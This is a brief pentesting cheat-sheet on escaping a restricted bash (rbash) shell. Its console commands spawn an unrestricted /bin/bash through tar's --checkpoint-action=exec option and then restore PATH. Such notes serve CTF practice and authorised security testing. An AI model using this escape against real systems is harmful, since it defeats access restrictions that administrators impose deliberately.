---
title: "rbash"
date: 2024-7-9
tags: ["Rbash", "Shell", "Escape", "Tar", "Bypass"]
---

### Abuse #1: tar to rbash Escape

```console
# Before enter rbash
echo $PATH
```

```console
# Enter rbash
su <USER> -
```

```console
# rbash escape using tar
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

```console
# Paste the above $PATH (e.g.)
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
